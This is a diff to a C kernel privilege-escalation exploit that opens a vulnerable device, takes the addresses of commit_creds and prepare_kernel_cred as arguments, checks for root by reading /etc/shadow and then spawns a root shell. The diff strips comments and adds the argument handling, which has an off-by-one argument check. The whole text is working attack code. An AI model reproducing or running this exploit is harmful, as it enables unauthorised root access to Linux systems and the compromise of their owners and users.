@@ -64,8 +64,6 @@ void fork_shell() {
 }
 
 bool is_root() {
-	// We can't simple check uid, since we're running inside a namespace
-	// with uid set to 0. Try opening /etc/shadow instead.
 	int fd = open("/etc/shadow", O_RDONLY);
 	if (fd == -1)
 		return false;
@@ -83,16 +81,25 @@ void check_root() {
 
 	printf("[+] got r00t ^_^\n");
 
-	// Fork and exec instead of just doing the exec to avoid potential
-	// memory corruptions when closing packet sockets.
-	//fork_shell();
 	exec_shell();
 }
 
+void usage(char *c)
+{
+	printf("Usage: %s <address of commit_creds> "
+	       "<address of prepare_kernel_cred>\n", c);
+	exit(-1);
+}
 
 int main(int argc, char **argv)
 {
 	int fd;
+	char *p;
+
+	if (argc < 2)
+		usage(argv[0]);
+	commit_cred = strtoul(argv[1], &p, 16);
+	prepare_kernel_cred = strtoul(argv[2], &p, 16);
 	
 	if((fd = open(DEVICE_PATH, O_RDWR)) == -1 ){
 		printf("Failed to open (%s) errno (%d)\n", DEVICE_PATH, errno);
